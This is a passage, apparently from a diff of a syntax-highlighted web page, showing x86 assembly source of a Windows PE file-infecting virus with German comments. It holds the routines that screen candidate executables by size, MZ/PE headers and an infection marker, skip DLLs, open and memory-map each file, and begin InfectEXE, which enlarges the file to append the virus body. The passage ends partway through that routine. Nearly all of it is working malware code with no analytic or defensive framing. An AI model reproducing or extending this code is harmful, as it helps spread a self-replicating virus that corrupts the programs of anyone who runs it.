+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; die Datei infizieren können</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; esi zeigt auch auf den Dateiname</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Wenn die Datei kleiner als</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; 200 Bytes ist wird sie nicht überprüft</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>WFD_nFileSizeLow<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> 200d<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jbe</span> NoInfection<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Wir infizieren auch keine Dateien, die größer als 4,3 GB sind</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>WFD_nFileSizeHigh<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jne</span> NoInfection<br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">call</span> OpenFile &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Datei öffnen</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jc</span> NoInfection &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Wenn es Probleme gibt, beenden wir dies</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">call</span> CheckMZSign &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Wir machen nur weiter wenn der DOS-Stub existiert</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jc</span> Notagoodfile<br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">+</span><span style="color: #ff0000;">3Ch</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0h</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">je</span> Notagoodfile<br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">esi</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Wir ermitteln den Anfang des PE-Headers</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">+</span><span style="color: #ff0000;">3Ch</span><span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Falls er ausserhalb der Datei liegt schließen wir diese wieder</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>WFD_nFileSizeLow<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">esi</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jb</span> Notagoodfile<br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">esi</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">call</span> CheckPESign &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Überprüfen ob diese Datei einen PE-Header hat</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jc</span> Notagoodfile<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; wir überprüfen ob unsere Infektionsmarke gesetzt ist</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; --&gt; Test</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">4Ch</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">'tseT'</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jz</span> Notagoodfile<br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">16h</span><span style="color: black;">&#93;</span><span style="color: black; font-style: italic;">; Charakteristiken der Datei aus dem PE-Header lesen</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">and</span> <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0F000h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Dll-Flag auswählen</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">02000h</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">je</span> Notagoodfile &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; wir wollen keine DLL Dateien infizieren</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">16h</span><span style="color: black;">&#93;</span><span style="color: black; font-style: italic;">; Charakteristiken erneut lesen</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">and</span> <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">00002h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Überprüfen ob wir OBJ Dateien haben</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">00002h</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jne</span> Notagoodfile &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">call</span> InfectEXE &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Alles klar, diese Datei können wir infizieren</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jc</span> NoInfection &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Falls es Fehler gibt, während</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; wir die Datei neu mappen brauchen wir sie</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; nicht wieder unmappen und zu schließen</span><br/>
+<br/>
+<br/>
+Notagoodfile<span style="color: #339933;">:</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">call</span> UnMapFile &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Wir unmappen die Datei und schreiben dadurch</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; wieder auf die Platte</span><br/>
+<br/>
+NoInfection<span style="color: #339933;">:</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">ret</span><br/>
+<br/>
+<br/>
+<span style="color: black; font-style: italic;">; ***************************************************************************</span><br/>
+<span style="color: black; font-style: italic;">; -------------------[ Öffnen und schließen der Dateien ]--------------------</span><br/>
+<span style="color: black; font-style: italic;">; ***************************************************************************</span><br/>
+<br/>
+OpenFile<span style="color: #339933;">:</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Wir öffnen die Dateie</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">3h</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">inc</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">80000000h</span> <span style="color: #00007f; font-weight: bold;">or</span> <span style="color: #ff0000;">40000000h</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">esi</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Name der Datei in esi</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">call</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>XCreateFileA<span style="color: black;">&#93;</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">inc</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jz</span> Closed &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Falls es Fehler gibt stoppen wir hier</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">dec</span> <span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Der Datei-Handle ist in eax, wir speichern ihn</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>FileHandle<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Wir mappen die Datei mit der Größe aus der Find32-Daten</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Struktur</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>WFD_nFileSizeLow<span style="color: black;">&#93;</span><br/>
+<br/>
+CreateMap<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; ist die Datei schon geöffnen mappen</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; wir sie in der Größe aus ecx</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">ecx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Datei speichern</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; wir müssen ein Map erstellen um in der Lage</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; zu sein, sie vernünftig zu editieren</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">00000004h</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>FileHandle<span style="color: black;">&#93;</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">call</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>XCreateFileMappingA<span style="color: black;">&#93;</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>MapHandle<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">pop</span> <span style="color: #46aa03; font-weight: bold;">ecx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Größe wieder laden</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">test</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Wenn es nen Fehler beim Mappen gab, schließen wir die </span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jz</span> CloseFile &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Datei wieder...</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">xor</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Die Datei wird gemappt.. *bla*</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #ff0000;">2h</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>MapHandle<span style="color: black;">&#93;</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">call</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>XMapViewOfFile<span style="color: black;">&#93;</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">or</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Falls es Fehler gab, unmappen wir sie wieder</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">jz</span> UnMapFile<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; EAX enthält den offset an dem die Datei nun liegt</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>MapAddress<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Carriage Flag wird gelöscht, da wir Erfolg hatten</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">clc</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Datei offen --&gt; kein flag</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Datei zu &nbsp; &nbsp;--&gt; Carriage Flag</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">ret</span><br/>
+<br/>
+UnMapFile<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Datei wieder unmappen</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">call</span> UnMapFile2<br/>
+<br/>
+CloseFile<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; und schließen</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>FileHandle<span style="color: black;">&#93;</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">call</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>XCloseHandle<span style="color: black;">&#93;</span><br/>
+<br/>
+Closed<span style="color: #339933;">:</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">stc</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Carriage Flag setzen</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">ret</span><br/>
+<br/>
+UnMapFile2<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Wir müssen sie öfters unmappen um sie später</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; mit mehr Platz zu mappen, damit wir den Virus</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; anhängen können</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>MapAddress<span style="color: black;">&#93;</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">call</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>XUnmapViewOfFile<span style="color: black;">&#93;</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">push</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>MapHandle<span style="color: black;">&#93;</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">call</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>XCloseHandle<span style="color: black;">&#93;</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">ret</span><br/>
+<br/>
+&nbsp; <br/>
+<span style="color: black; font-style: italic;">; ***************************************************************************</span><br/>
+<span style="color: black; font-style: italic;">; ----------------------[ Infektion der EXE-Datei ]--------------------------</span><br/>
+<span style="color: black; font-style: italic;">; ***************************************************************************</span><br/>
+<br/>
+InfectEXE<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; MapAddress enthält den Startoffset der Datei</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">+</span><span style="color: #ff0000;">3Ch</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; esi zeigt auf den PE-Header</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; ecx enthält nun den Alignment Faktor</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Die Größe wird in eax geladen</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>WFD_nFileSizeLow<span style="color: black;">&#93;</span> <br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">add</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> VirusSize<br/>
+&nbsp;<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">call</span> <span style="color: #0000ff; font-weight: bold;">Align</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; nun wird die neue Größe auf den Alignment Faktor gerundet</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">+</span>NewSize<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">xchg</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">pushad</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Register speichern</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Wir schließen die Datei und laden sie mit</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; der neu ermittelten Größe, so das wir unseren</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; Code hinzufügen können</span><br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">call</span> UnMapFile2<br/>
+&nbsp;<span style="color: #00007f; font-weight: bold;">popad</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; Register wiederherstellen</span><br/>
+<br/>
